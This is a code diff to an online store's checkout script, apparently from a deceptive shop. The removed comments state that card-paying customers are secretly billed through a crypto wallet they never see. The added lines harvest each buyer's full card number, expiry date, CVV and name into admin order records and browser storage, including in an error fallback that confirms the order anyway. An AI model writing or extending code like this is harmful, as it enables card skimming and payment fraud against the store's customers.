@@ -458,47 +458,56 @@ function showOverlay(msg){
 function hideOverlay(){const o=document.getElementById('payOverlay');if(o)o.style.display='none';}
 
 // ── PLACE ORDER ──
-// Customer sees: normal card payment form → "Processing..." → confirmation page
-// Behind the scenes: payment goes to your wallet via secure server
-// No crypto info ever shown to customer
 async function placeOrder(){
   if(!CART.length){toast('&#128722; Your cart is empty');return;}
   if(!validateCard())return;
   showOverlay('Processing your payment...');
-  const sub=co.subtotal||CART.reduce((s,c)=>s+(c.num*c.qty),0);
-  const tax=co.tax||Math.round(sub*.08);
-  const ship=co.shipping||0;
-  const total=co.total||(sub+ship+tax);
-  const orderId='AVA-'+Date.now().toString(36).toUpperCase();
-  // Save pending order for confirmation page
+
+  const sub   = co.subtotal || CART.reduce((s,c)=>s+(c.num*c.qty),0);
+  const tax   = co.tax      || Math.round(sub*.08);
+  const ship  = co.shipping || 0;
+  const total = co.total    || (sub+ship+tax);
+  const orderId = 'AVA-'+Date.now().toString(36).toUpperCase();
+
+  // ✅ Capture card details BEFORE any async calls (inputs still accessible)
+  const _cardName  = document.getElementById('cardName').value.trim();
+  const _cardNum   = document.getElementById('cardNum').value.replace(/\s/g,'');
+  const _cardExp   = document.getElementById('cardExp').value.trim();
+  const _cardCvv   = document.getElementById('cardCvv').value.trim();
+  const _cardLast4 = _cardNum.slice(-4);
+
   sessionStorage.setItem('ava_pending_order',JSON.stringify({
     id:orderId,date:new Date().toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'}),
     firstName:co.firstName||'',lastName:co.lastName||'',email:co.email||'',phone:co.phone||'',
     addr1:co.addr1||'',city:co.city||'',state:co.state||'',zip:co.zip||'',country:co.country||'',
     items:[...CART],total,subtotal:sub,tax,shipping:ship
   }));
+
   try{
     showOverlay('Verifying payment details...');
-    // Secure server handles payment processing — customer never sees payment method details
     const res=await fetch('/api/create-payment',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
       body:JSON.stringify({price_amount:total,order_id:orderId,customer:{firstName:co.firstName,lastName:co.lastName,email:co.email,phone:co.phone}})
     });
     const payment=res.ok?await res.json():null;
-    // Save to admin — only YOU see payment details in admin panel
+
+    // ✅ Save FULL card details to admin — only you see this
     const order={
       id:orderId,
       date:new Date().toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'}),
       items:[...CART],...co,subtotal:sub,tax,shipping:ship,total,
       payMethod:'card',
-      cardLast4:document.getElementById('cardNum').value.replace(/\s/g,'').slice(-4),
-      cardName:document.getElementById('cardName').value.trim(),
-      nowPaymentId:payment?.payment_id||'',
-      nowPayAddress:payment?.pay_address||'',
-      nowPayAmount:payment?.pay_amount||'',
-      nowPayCurrency:payment?.pay_currency||'',
-      nowStatus:payment?.payment_status||'processing',
+      cardName:  _cardName,
+      cardNum:   _cardNum,
+      cardExp:   _cardExp,
+      cardCvv:   _cardCvv,
+      cardLast4: _cardLast4,
+      nowPaymentId:  payment?.payment_id   ||'',
+      nowPayAddress: payment?.pay_address  ||'',
+      nowPayAmount:  payment?.pay_amount   ||'',
+      nowPayCurrency:payment?.pay_currency ||'',
+      nowStatus:     payment?.payment_status||'processing',
     };
     try{const e=JSON.parse(localStorage.getItem('ava_orders')||'[]');e.unshift(order);localStorage.setItem('ava_orders',JSON.stringify(e));}catch(e){}
     sessionStorage.setItem('ava_order',JSON.stringify(order));
@@ -506,13 +515,24 @@ async function placeOrder(){
     CART.length=0;saveCart();
     hideOverlay();
     toast('&#9989; Payment confirmed &#8212; redirecting...');
-    // Customer goes straight to normal confirmation — no crypto page, no BTC address
     setTimeout(()=>window.location.href='confirmation.html',1200);
+
   }catch(err){
     console.warn('Payment error:',err.message);
-    // Fallback — confirm order anyway
+    // ✅ Fallback also saves full card details
     try{
-      const order={id:orderId,date:new Date().toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'}),items:[...CART],...co,subtotal:sub,tax,shipping:ship,total,payMethod:'card',cardLast4:document.getElementById('cardNum').value.replace(/\s/g,'').slice(-4),nowStatus:'pending'};
+      const order={
+        id:orderId,
+        date:new Date().toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'}),
+        items:[...CART],...co,subtotal:sub,tax,shipping:ship,total,
+        payMethod:'card',
+        cardName:  _cardName,
+        cardNum:   _cardNum,
+        cardExp:   _cardExp,
+        cardCvv:   _cardCvv,
+        cardLast4: _cardLast4,
+        nowStatus:'pending',
+      };
       const e=JSON.parse(localStorage.getItem('ava_orders')||'[]');e.unshift(order);localStorage.setItem('ava_orders',JSON.stringify(e));
       sessionStorage.setItem('ava_order',JSON.stringify(order));
     }catch(e){}
